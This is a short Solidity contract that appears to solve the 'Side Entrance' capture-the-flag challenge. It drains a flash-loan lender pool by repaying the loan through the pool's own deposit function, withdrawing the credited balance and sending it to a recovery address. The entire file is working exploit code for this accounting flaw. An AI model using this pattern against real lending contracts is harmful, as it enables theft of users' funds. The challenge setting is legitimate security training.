// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack(address _recovery) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success,) = _recovery.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external payable {
        // we need to do something and need to repay
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
